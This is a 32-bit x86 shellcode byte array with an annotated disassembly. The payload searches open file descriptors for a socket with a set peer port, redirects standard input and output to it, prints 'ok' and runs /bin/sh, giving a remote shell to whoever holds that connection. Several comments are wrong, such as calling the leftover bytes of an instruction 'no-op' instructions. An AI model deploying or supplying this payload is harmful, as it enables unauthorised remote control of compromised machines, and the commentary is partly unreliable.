char shellcode[] =
  "\x89\xe2\x83\xec\x10\x6a\x10\x54\x52\x6a\x00\x6a\x00\xb8\x1f"
  "\x00\x00\x00\xcd\x80\x80\x7a\x01\x02\x75\x0b\x66\x81\x7a\x02"
  "\x42\x41\x75\x03\xeb\x0f\x90\xff\x44\x24\x04\x81\x7c\x24\x04"
  "\x00\x01\x00\x00\x75\xda\xc7\x44\x24\x08\x00\x00\x00\x00\xb8"
  "\x5a\x00\x00\x00\xcd\x80\xff\x44\x24\x08\x83\x7c\x24\x08\x03"
  "\x75\xee\x68\x0b\x6f\x6b\x0b\x81\x34\x24\x01\x00\x00\x01\x89"
  "\xe2\x6a\x04\x52\x6a\x01\x6a\x00\xb8\x04\x00\x00\x00\xcd\x80"
  "\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe2\x31\xc0\x50"
  "\x52\x89\xe1\x50\x51\x52\x50\xb8\x3b\x00\x00\x00\xcd\x80\xcc";


0:  89 e2                   mov    edx,esp    ;Move the current stack pointer value into the edx register
2:  83 ec 10                sub    esp,0x10   ;Subtract 16 bytes from the stack pointer
5:  6a 10                   push   0x10       ;Push the value 16 onto the stack
7:  54                      push   esp        ;Push the current stack pointer value onto the stack
8:  52                      push   edx        ;Push the original stack pointer value onto the stack
9:  6a 00                   push   0x0        ;Push the value 0 onto the stack
b:  6a 00                   push   0x0        ;Push the value 0 onto the stack
d:  b8 1f 00 00 00          mov    eax,0x1f   ;Move the value 31 into the eax register
12: cd 80                   int    0x80       ;Call the kernel with the system call number stored in eax
14: 80 7a 01 02             cmp    BYTE PTR [edx+0x1],0x2   ;Compare the second byte of the original stack pointer value with the value 2
18: 75 0b                   jne    0x25       ;If the comparison is not equal, jump to the instruction at address 0x25
1a: 66 81 7a 02 42 41       cmp    WORD PTR [edx+0x2],0x4142    ;Compare the third and fourth bytes of the original stack pointer value with the value 0x4142
20: 75 03                   jne    0x25       ;If the comparison is not equal, jump to the instruction at address 0x25
22: eb 0f                   jmp    0x33       ;Jump to the instruction at address 0x33
24: 90                      nop               ;Do nothing
25: ff 44 24 04             inc    DWORD PTR [esp+0x4]    ;Increment the value at the location 4 bytes above the current stack pointer
29: 81 7c 24 04 00 01 00    cmp    DWORD PTR [esp+0x4],0x100    ;This line performs a comparison operation (cmp) between the value at the memory location [esp+0x4] and the constant value 0x100
30: 00                                        ;This line is a no-op instruction
31: 75 da                   jne    0xd        ;This line performs a conditional jump (jne) to the memory location 0xd if the previous comparison (cmp) was not equal
33: c7 44 24 08 00 00 00    mov    DWORD PTR [esp+0x8],0x0    ;This line moves the constant value 0x0 into the memory location [esp+0x8]
3a: 00                                        ;This line is a no-op instruction
3b: b8 5a 00 00 00          mov    eax,0x5a   ;This line moves the constant value 0x5a into the eax register
40: cd 80                   int    0x80       ;This line performs a software interrupt (int) with the value 0x80  i.e. systemcall
42: ff 44 24 08             inc    DWORD PTR [esp+0x8]    ;This line increments the value at the memory location [esp+0x8]
46: 83 7c 24 08 03          cmp    DWORD PTR [esp+0x8],0x3    ;This line performs a comparison operation (cmp) between the value at the memory location [esp+0x8] and the constant value 0x3
4b: 75 ee                   jne    0x3b
4d: 68 0b 6f 6b 0b          push   0xb6b6f0b
52: 81 34 24 01 00 00 01    xor    DWORD PTR [esp],0x1000001
59: 89 e2                   mov    edx,esp
5b: 6a 04                   push   0x4
5d: 52                      push   edx
5e: 6a 01                   push   0x1
60: 6a 00                   push   0x0
62: b8 04 00 00 00          mov    eax,0x4
67: cd 80                   int    0x80
69: 68 2f 73 68 00          push   0x68732f
6e: 68 2f 62 69 6e          push   0x6e69622f
73: 89 e2                   mov    edx,esp
75: 31 c0                   xor    eax,eax
77: 50                      push   eax
78: 52                      push   edx
79: 89 e1                   mov    ecx,esp
7b: 50                      push   eax
7c: 51                      push   ecx
7d: 52                      push   edx
7e: 50                      push   eax
7f: b8 3b 00 00 00          mov    eax,0x3b
84: cd 80                   int    0x80
86: cc                      int3
